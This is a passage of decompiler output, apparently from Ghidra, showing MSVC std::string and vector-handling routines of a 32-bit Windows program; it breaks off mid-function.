        FUN_00403ef4(this,*(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                            **)((int)this + 8),local_44);
        local_54 = *ppcVar1;
        iVar7 = 0x1a;
        for (param_2 = (void *)0x1;
            (local_20 != 0 && (param_2 < (void *)((local_1c - local_20) / 0x1a)));
            param_2 = (void *)((int)param_2 + 1)) {
          pcVar3 = ((char **)(local_20 + iVar7))[1];
          pcVar2 = *(char **)(local_20 + iVar7);
          local_34[0] = local_11;
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_34,false);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (local_34,pcVar2,pcVar3);
          local_8._0_1_ = 2;
          FUN_00403ef4(this,*(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                              **)((int)this + 8),local_34);
          local_8 = CONCAT31(local_8._1_3_,1);
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                    (local_34,true);
          iVar7 = iVar7 + 0x1a;
        }
        if (0 < param_5) {
          param_5 = param_5 + -1;
        }
        local_8 = local_8 & 0xffffff00;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                  (local_44,true);
      }
    } while (param_5 != 1);
  }
  pcVar3 = local_54;
  if (param_6 == '\0') {
    if ((local_54 != local_68) || (param_5 != 0)) {
      pbVar6 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
               std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::
               basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                         (local_44,local_54,local_68,(allocator<char> *)&local_11);
      local_8._0_1_ = 4;
      FUN_00403ee3(this,pbVar6);
      goto LAB_00403d1d;
    }
  }
  else if ((*local_54 != '\0') || (param_5 != 0)) {
    local_44[0] = local_11;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_44,false);
    sVar5 = strlen(pcVar3);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_44,pcVar3,sVar5);
    local_8._0_1_ = 3;
    FUN_00403ee3(this,local_44);
LAB_00403d1d:
    local_8 = (uint)local_8._1_3_ << 8;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_44,true);
    if (param_5 != 0) goto LAB_00403d50;
  }
  while (((*(int *)((int)this + 4) != 0 &&
          (iVar7 = *(int *)((int)this + 8), (iVar7 - *(int *)((int)this + 4) & 0xfffffff0U) != 0))
         && (*(int *)(iVar7 + -8) == 0))) {
    FUN_00403f1e(this,(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                       *)(iVar7 + -0x10));
  }
LAB_00403d50:
  if (*(int *)((int)this + 4) == 0) {
    iVar7 = 0;
  }
  else {
    iVar7 = *(int *)((int)this + 8) - *(int *)((int)this + 4) >> 4;
  }
  FUN_00402249((int)local_24);
  ExceptionList = local_10;
  return iVar7;
}



int __thiscall FUN_00403d7c(void *this,uint param_1)

{
  int *piVar1;
  
  piVar1 = (int *)FUN_00402504((void *)((int)this + 4),param_1);
  return *piVar1 - *(int *)((int)this + 0x14);
}



int __thiscall FUN_00403d94(void *this,uint param_1)

{
  int iVar1;
  int *piVar2;
  
  iVar1 = FUN_00402504((void *)((int)this + 4),param_1);
  iVar1 = *(int *)(iVar1 + 4);
  piVar2 = (int *)FUN_00402504((void *)((int)this + 4),param_1);
  return iVar1 - *piVar2;
}



void __thiscall FUN_00403dbb(void *this,uint param_1,undefined4 *param_2)

{
  uint uVar1;
  int iVar2;
  
  iVar2 = *(int *)((int)this + 4);
  if (iVar2 == 0) {
    uVar1 = 0;
  }
  else {
    uVar1 = (*(int *)((int)this + 8) - iVar2) / 0x1a;
  }
  if (uVar1 < param_1) {
    if (iVar2 == 0) {
      iVar2 = 0;
    }
    else {
      iVar2 = (*(int *)((int)this + 8) - iVar2) / 0x1a;
    }
    FUN_00403358(this,*(undefined4 **)((int)this + 8),(undefined4 *)(param_1 - iVar2),param_2);
  }
  else if (iVar2 != 0) {
    if (param_1 < (uint)((*(int *)((int)this + 8) - iVar2) / 0x1a)) {
      FUN_00403315(this,(undefined4 *)(param_1 * 0x1a + iVar2),*(undefined4 **)((int)this + 8));
    }
  }
  return;
}



void __thiscall FUN_00403e27(void *this,uint param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar2;
  uint uVar3;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar4;
  int iVar5;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar6;
  
  if (*(int *)((int)this + 4) == 0) {
    uVar3 = 0;
  }
  else {
    uVar3 = *(int *)((int)this + 0xc) - *(int *)((int)this + 4) >> 4;
  }
  if (uVar3 < param_1) {
    uVar3 = param_1;
    if ((int)param_1 < 0) {
      uVar3 = 0;
    }
    pbVar4 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             operator_new(uVar3 << 4);
    pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 8);
    pbVar1 = pbVar4;
    for (pbVar6 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                   ((int)this + 4); pbVar6 != pbVar2; pbVar6 = pbVar6 + 0x10) {
      FUN_00404380(pbVar1,pbVar6);
      pbVar1 = pbVar1 + 0x10;
    }
    pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 8);
    for (pbVar6 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                   ((int)this + 4); pbVar6 != pbVar1; pbVar6 = pbVar6 + 0x10) {
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (pbVar6,true);
    }
    operator_delete(*(void **)((int)this + 4));
    *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
     ((int)this + 0xc) = pbVar4 + param_1 * 0x10;
    if (*(int *)((int)this + 4) == 0) {
      iVar5 = 0;
    }
    else {
      iVar5 = *(int *)((int)this + 8) - *(int *)((int)this + 4) >> 4;
    }
    *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
     ((int)this + 4) = pbVar4;
    *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
     ((int)this + 8) = pbVar4 + iVar5 * 0x10;
  }
  return;
}



void __thiscall
FUN_00403ee3(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1)

{
  FUN_00403fe2(this,*(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>
                      **)((int)this + 8),
               (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x1,
               param_1);
  return;
}



int __thiscall
FUN_00403ef4(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_2)

{
  int iVar1;
  
  iVar1 = *(int *)((int)this + 4);
  FUN_00403fe2(this,param_1,
               (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x1,
               param_2);
  return ((int)param_1 - iVar1 >> 4) * 0x10 + *(int *)((int)this + 4);
}



basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall
FUN_00403f1e(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar2;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_8;
  
  pbVar2 = param_1 + 0x10;
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 8);
  if (pbVar2 != pbVar1) {
    local_8 = param_1;
    do {
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (local_8,pbVar2,0,*(uint *)npos_exref);
      local_8 = local_8 + 0x10;
      pbVar2 = pbVar2 + 0x10;
    } while (pbVar2 != pbVar1);
  }
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 8);
  for (pbVar2 = pbVar1 + -0x10; pbVar2 != pbVar1; pbVar2 = pbVar2 + 0x10) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (pbVar2,true);
  }
  *(int *)((int)this + 8) = *(int *)((int)this + 8) + -0x10;
  return param_1;
}



basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> * __thiscall
FUN_00403f7f(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_2)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar2;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this_00;
  
  pbVar1 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 8);
  this_00 = param_1;
  if (param_2 != pbVar1) {
    do {
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                (this_00,param_2,0,*(uint *)npos_exref);
      param_2 = param_2 + 0x10;
      this_00 = this_00 + 0x10;
    } while (param_2 != pbVar1);
  }
  pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 8);
  for (pbVar1 = this_00; pbVar1 != pbVar2; pbVar1 = pbVar1 + 0x10) {
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (pbVar1,true);
  }
  *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)((int)this + 8)
       = this_00;
  return param_1;
}



void __thiscall
FUN_00403fe2(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_2,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_3)

{
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar2;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar3;
  int iVar4;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *this_00;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar5;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_c;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_8;
  
  pbVar5 = param_2;
  pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 8);
  if ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
      (*(int *)((int)this + 0xc) - (int)pbVar2 >> 4) < param_2) {
    iVar4 = *(int *)((int)this + 4);
    if ((iVar4 == 0) ||
       (pbVar1 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                 ((int)pbVar2 - iVar4 >> 4), pbVar1 <= param_2)) {
      pbVar1 = param_2;
    }
    if (iVar4 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = (int)pbVar2 - iVar4 >> 4;
    }
    pbVar1 = pbVar1 + iVar4;
    pbVar2 = pbVar1;
    if ((int)pbVar1 < 0) {
      pbVar2 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
    }
    pbVar3 = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             operator_new((int)pbVar2 << 4);
    param_2 = pbVar3;
    for (pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                   ((int)this + 4); pbVar2 != param_1; pbVar2 = pbVar2 + 0x10) {
      FUN_00404380(param_2,pbVar2);
      param_2 = param_2 + 0x10;
    }
    if (pbVar5 != (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
                  0x0) {
      local_c = pbVar5;
      pbVar2 = param_2;
      do {
        FUN_00404380(pbVar2,param_3);
        pbVar2 = pbVar2 + 0x10;
        local_c = local_c + -1;
      } while (local_c !=
               (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0);
    }
    pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 8);
    param_3 = param_2 + (int)pbVar5 * 0x10;
    if (param_1 != pbVar2) {
      do {
        FUN_00404380(param_3,param_1);
        param_1 = param_1 + 0x10;
        param_3 = param_3 + 0x10;
      } while (param_1 != pbVar2);
    }
    pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 8);
    for (this_00 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **
                    )((int)this + 4); this_00 != pbVar2; this_00 = this_00 + 0x10) {
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
                (this_00,true);
    }
    operator_delete(*(void **)((int)this + 4));
    *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
     ((int)this + 0xc) = pbVar3 + (int)pbVar1 * 0x10;
    if (*(int *)((int)this + 4) == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = *(int *)((int)this + 8) - *(int *)((int)this + 4) >> 4;
    }
    *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
     ((int)this + 4) = pbVar3;
    *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
     ((int)this + 8) = pbVar3 + (int)(pbVar5 + iVar4) * 0x10;
  }
  else {
    if ((basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
        ((int)pbVar2 - (int)param_1 >> 4) < param_2) {
      local_8 = param_1;
      local_c = param_1 + (int)param_2 * 0x10;
      if (param_1 != pbVar2) {
        do {
          FUN_00404380(local_c,local_8);
          local_8 = local_8 + 0x10;
          local_c = local_c + 0x10;
        } while (local_8 != pbVar2);
      }
      pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 8);
      for (iVar4 = (int)param_2 - ((int)pbVar2 - (int)param_1 >> 4); iVar4 != 0; iVar4 = iVar4 + -1)
      {
        FUN_00404380(pbVar2,param_3);
        pbVar2 = pbVar2 + 0x10;
      }
      pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 8);
      if (param_1 != pbVar2) {
        do {
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (param_1,param_3,0,*(uint *)npos_exref);
          param_1 = param_1 + 0x10;
        } while (param_1 != pbVar2);
      }
    }
    else {
      if (param_2 ==
          (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
        return;
      }
      pbVar5 = pbVar2;
      for (pbVar1 = pbVar2 + (int)param_2 * -0x10; pbVar1 != pbVar2; pbVar1 = pbVar1 + 0x10) {
        FUN_00404380(pbVar5,pbVar1);
        pbVar5 = pbVar5 + 0x10;
      }
      pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 8);
      pbVar5 = pbVar2 + (int)param_2 * -0x10;
      while (param_1 != pbVar5) {
        pbVar5 = pbVar5 + -0x10;
        pbVar2 = pbVar2 + -0x10;
        std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                  (pbVar2,pbVar5,0,*(uint *)npos_exref);
      }
      pbVar2 = param_1 + (int)param_2 * 0x10;
      if (param_1 != pbVar2) {
        do {
          std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
                    (param_1,param_3,0,*(uint *)npos_exref);
          param_1 = param_1 + 0x10;
        } while (param_1 != pbVar2);
      }
    }
    *(int *)((int)this + 8) = *(int *)((int)this + 8) + (int)param_2 * 0x10;
  }
  return;
}



void __cdecl FUN_00404231(void *param_1,int param_2)

{
  undefined4 *puVar1;
  int iVar2;
  undefined4 *puVar3;
  int iVar4;
  int iVar5;
  undefined4 *puVar6;
  undefined4 *puVar7;
  undefined4 *puVar8;
  undefined4 *puVar9;
  undefined4 local_28;
  undefined4 local_24;
  undefined local_20;
  undefined4 local_1f;
  undefined4 local_1b;
  undefined local_17;
  undefined4 local_16;
  undefined4 local_12;
  undefined4 *local_c;
  int local_8;
  
  iVar4 = *(int *)((int)param_1 + 4);
  if (*(char *)(iVar4 + 8) == '\0') {
    local_20 = 0;
    local_17 = 0;
    local_28 = 0;
    local_24 = 0;
    local_1f = 0;
    local_1b = 0;
    local_16 = DAT_00417674;
    local_12 = DAT_00417674;
    if (iVar4 == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = (*(int *)((int)param_1 + 8) - iVar4) / 0x1a;
    }
    FUN_00403dbb(param_1,iVar4 - *(int *)(param_2 + 8),&local_28);
  }
  else {
    local_c = *(undefined4 **)(param_2 + 4);
    local_8 = 0;
    puVar3 = (undefined4 *)*local_c;
    while (local_c != puVar3) {
      puVar1 = (undefined4 *)*puVar3;
      if (local_c == puVar1) {
        puVar7 = *(undefined4 **)((int)param_1 + 8);
        puVar6 = (undefined4 *)((puVar3[2] - local_8) * 0x1a + *(int *)((int)param_1 + 4));
        for (puVar3 = (undefined4 *)((puVar3[2] + 1) * 0x1a + *(int *)((int)param_1 + 4));
            puVar3 != puVar7; puVar3 = (undefined4 *)((int)puVar3 + 0x1a)) {
          puVar8 = puVar3;
          puVar9 = puVar6;
          for (iVar4 = 6; iVar4 != 0; iVar4 = iVar4 + -1) {
            *puVar9 = *puVar8;
            puVar8 = puVar8 + 1;
            puVar9 = puVar9 + 1;
          }
          puVar6 = (undefined4 *)((int)puVar6 + 0x1a);
          *(undefined2 *)puVar9 = *(undefined2 *)puVar8;
        }
      }
      else {
        iVar4 = puVar1[2];
        iVar2 = *(int *)((int)param_1 + 4);
        puVar7 = (undefined4 *)((puVar3[2] - local_8) * 0x1a + iVar2);
        for (puVar3 = (undefined4 *)((puVar3[2] + 1) * 0x1a + iVar2);
            puVar3 != (undefined4 *)(iVar4 * 0x1a + iVar2);
            puVar3 = (undefined4 *)((int)puVar3 + 0x1a)) {
          puVar6 = puVar3;
          puVar8 = puVar7;
          for (iVar5 = 6; iVar5 != 0; iVar5 = iVar5 + -1) {
            *puVar8 = *puVar6;
            puVar6 = puVar6 + 1;
            puVar8 = puVar8 + 1;
          }
          puVar7 = (undefined4 *)((int)puVar7 + 0x1a);
          *(undefined2 *)puVar8 = *(undefined2 *)puVar6;
        }
      }
      local_8 = local_8 + 1;
      puVar3 = puVar1;
    }
    local_20 = 0;
    local_17 = 0;
    local_28 = 0;
    local_24 = 0;
    local_1f = 0;
    local_1b = 0;
    if (*(int *)((int)param_1 + 4) == 0) {
      iVar4 = 0;
    }
    else {
      iVar4 = (*(int *)((int)param_1 + 8) - *(int *)((int)param_1 + 4)) / 0x1a;
    }
    local_16 = DAT_00417674;
    local_12 = DAT_00417674;
    FUN_00403dbb(param_1,iVar4 - local_8,&local_28);
  }
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __cdecl
FUN_00404380(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_2)

{
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415942;
  local_10 = ExceptionList;
  local_8 = 0;
  if (param_1 != (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0
     ) {
    ExceptionList = &local_10;
    *param_1 = *param_2;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (param_1,false);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (param_1,param_2,0,*(uint *)npos_exref);
  }
  ExceptionList = local_10;
  return;
}



undefined4 FUN_004043cd(void)

{
  return 0x160;
}



void __cdecl FUN_004043d3(undefined4 *param_1)

{
  if (param_1 != (undefined4 *)0x0) {
    (**(code **)*param_1)(1);
  }
  return;
}



uint __fastcall FUN_00404492(int param_1)

{
  int iVar1;
  uint uVar2;
  
  iVar1 = *(int *)(param_1 + 0x17);
  if (iVar1 == 0) {
    return 1;
  }
  uVar2 = iVar1 - 1;
  if ((uVar2 != 0) && (uVar2 = iVar1 - 2, uVar2 == 0)) {
    return (uint)*(byte *)(param_1 + 10);
  }
  return uVar2 & 0xffffff00;
}



void __thiscall FUN_004044aa(void *this,int param_1)

{
  undefined uVar1;
  undefined4 uVar2;
  undefined4 uVar3;
  void *this_00;
  void *this_01;
  
  uVar1 = *(undefined *)((int)this + 8);
  *(undefined *)((int)this + 8) = *(undefined *)(param_1 + 8);
  *(undefined *)(param_1 + 8) = uVar1;
  uVar1 = *(undefined *)((int)this + 9);
  *(undefined *)((int)this + 9) = *(undefined *)(param_1 + 9);
  *(undefined *)(param_1 + 9) = uVar1;
  uVar1 = *(undefined *)((int)this + 10);
  *(undefined *)((int)this + 10) = *(undefined *)(param_1 + 10);
  *(undefined *)(param_1 + 10) = uVar1;
  uVar2 = *(undefined4 *)((int)this + 0xb);
  *(undefined4 *)((int)this + 0xb) = *(undefined4 *)(param_1 + 0xb);
  *(undefined4 *)(param_1 + 0xb) = uVar2;
  uVar2 = *(undefined4 *)((int)this + 0xf);
  *(undefined4 *)((int)this + 0xf) = *(undefined4 *)(param_1 + 0xf);
  *(undefined4 *)(param_1 + 0xf) = uVar2;
  uVar2 = *(undefined4 *)((int)this + 0x13);
  *(undefined4 *)((int)this + 0x13) = *(undefined4 *)(param_1 + 0x13);
  *(undefined4 *)(param_1 + 0x13) = uVar2;
  uVar2 = *(undefined4 *)((int)this + 0x17);
  *(undefined4 *)((int)this + 0x17) = *(undefined4 *)(param_1 + 0x17);
  *(undefined4 *)(param_1 + 0x17) = uVar2;
  uVar2 = *(undefined4 *)((int)this + 0x1b);
  uVar3 = *(undefined4 *)((int)this + 0x1f);
  *(undefined4 *)((int)this + 0x1b) = *(undefined4 *)(param_1 + 0x1b);
  *(undefined4 *)((int)this + 0x1f) = *(undefined4 *)(param_1 + 0x1f);
  *(undefined4 *)(param_1 + 0x1b) = uVar2;
  *(undefined4 *)(param_1 + 0x1f) = uVar3;
  uVar2 = *(undefined4 *)((int)this + 0x3f);
  *(undefined4 *)((int)this + 0x3f) = *(undefined4 *)(param_1 + 0x3f);
  *(undefined4 *)(param_1 + 0x3f) = uVar2;
  this_00 = *(void **)(param_1 + 0x4f);
  uVar2 = *(undefined4 *)((int)this + 0x4f);
  *(void **)((int)this + 0x4f) = this_00;
  *(undefined4 *)(param_1 + 0x4f) = uVar2;
  FUN_00408ccf(this_00,(undefined *)((int)this + 0x23),(char *)(param_1 + 0x23));
  FUN_00408ccf(this_01,(undefined *)((int)this + 0x2b),(char *)(param_1 + 0x2b));
  FUN_00406b02((void *)((int)this + 0x33),param_1 + 0x33);
  FUN_00406b02((void *)((int)this + 0x43),param_1 + 0x43);
  uVar2 = *(undefined4 *)((int)this + 4);
  *(undefined4 *)((int)this + 4) = *(undefined4 *)(param_1 + 4);
  *(undefined4 *)(param_1 + 4) = uVar2;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall
FUN_0040457c(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_2,
            undefined4 param_3,undefined4 param_4)

{
  undefined4 local_64 [21];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415954;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_004025a0(local_64,param_1,param_2,param_3,param_4);
  local_8 = 0;
  FUN_004044aa(this,(int)local_64);
  local_8 = 0xffffffff;
  FUN_00402269(local_64);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall
FUN_004045ca(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1,
            undefined4 param_2,undefined4 param_3)

{
  undefined4 local_64 [21];
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_00415968;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  FUN_00402534(local_64,param_1,param_2,param_3);
  local_8 = 0;
  FUN_004044aa(this,(int)local_64);
  local_8 = 0xffffffff;
  FUN_00402269(local_64);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

void __thiscall
FUN_00404615(void *this,
            basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *param_1)

{
  undefined uVar1;
  void *this_00;
  int local_2c;
  undefined4 local_28;
  undefined4 local_24;
  char local_20 [4];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_1c;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *local_18;
  undefined local_11;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  local_8 = 0xffffffff;
  puStack_c = &LAB_0041598e;
  local_10 = ExceptionList;
  ExceptionList = &local_10;
  local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)
             operator_new(0x10);
  local_8 = 0;
  local_18 = local_1c;
  if (local_1c ==
      (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0) {
    local_1c = (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
  }
  else {
    *local_1c = *param_1;
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Tidy
              (local_1c,false);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::assign
              (local_1c,param_1,0,*(uint *)npos_exref);
  }
  local_20[0] = local_1c !=
                (basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *)0x0;
  local_8 = 1;
  local_2c._0_1_ = param_1._3_1_;
  local_28 = FUN_00402864((void **)0x0,(void **)0x0);
  local_24 = 0;
  local_8._0_1_ = 2;
  local_11 = 0;
  if ((*(byte *)((int)this + 0x14) & 1) != 0) {
    FUN_0040291e(local_1c,'\x01');
  }
  FUN_004061be(this,local_1c,&local_11,&local_2c);
  FUN_00408ccf(this_00,local_20,(char *)((int)this + 0x2b));
  uVar1 = *(undefined *)((int)this + 8);
  *(undefined *)((int)this + 8) = local_11;
  local_11 = uVar1;
  FUN_00406b02(&local_2c,(int)this + 0x33);
  local_8 = CONCAT31(local_8._1_3_,1);
  FUN_004024c1(&local_2c);
  local_8 = 0xffffffff;
  FUN_0040260b(local_20);
  ExceptionList = local_10;
  return;
}



// WARNING: Function: _EH_prolog replaced with injection: EH_prolog

int * __thiscall
FUN_00404705(void *this,ushort **param_1,undefined4 *param_2,uint *param_3,void *param_4)

{
  int *piVar1;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> *pbVar2;
  ushort **ppuVar3;
  void *pvVar4;
  char cVar5;
  undefined4 *puVar6;
  int iVar7;
  size_t sVar8;
  uint uVar9;
  undefined4 uVar10;
  undefined *local_d0 [7];
  undefined *local_b4 [7];
  void *local_98;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_94 [16];
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_84 [16];
  undefined *local_74 [7];
  int *local_58;
  uint local_54;
  int local_50;
  basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> local_4c [16];
  undefined4 local_3c;
  undefined4 uStack_38;
  undefined4 uStack_34;
  undefined uStack_30;
  ushort *local_2c;
  undefined4 local_28;
  undefined4 local_24;
  undefined4 *local_20;
  char local_19;
  char local_18 [4];
  int *local_14;
  void *local_10;
  undefined *puStack_c;
  undefined4 local_8;
  
  puStack_c = &LAB_00415aa8;
  local_10 = ExceptionList;
  local_18[0] = '\0';
  local_14 = (int *)0x0;
  pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
            ((int)this + 0x27);
  local_8 = 0;
  local_19 = '\0';
  local_2c = *param_1;
  piVar1 = (int *)((int)this + 0xb);
  local_54 = *param_3;
  local_50 = *piVar1;
  ExceptionList = &local_10;
  local_98 = this;
  local_58 = piVar1;
  std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze(pbVar2)
  ;
  if ((ushort *)(-(uint)(*(int *)(pbVar2 + 4) != 0) & *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4))
      != *param_1) {
    pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
              ((int)this + 0x27);
    std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
              (pbVar2);
    local_20 = (undefined4 *)
               FUN_00406d0a(param_3,(char **)param_1,
                            (char *)(-(uint)(*(int *)(pbVar2 + 4) != 0) &
                                    *(int *)(pbVar2 + 8) + *(int *)(pbVar2 + 4)));
    if (local_20 != (undefined4 *)0x0) {
      pbVar2 = *(basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_> **)
                ((int)this + 0x27);
      std::basic_string<char,struct_std::char_traits<char>,class_std::allocator<char>_>::_Freeze
                (pbVar2);
      if (*(ushort **)(pbVar2 + 4) == local_2c) {
LAB_00404d63:
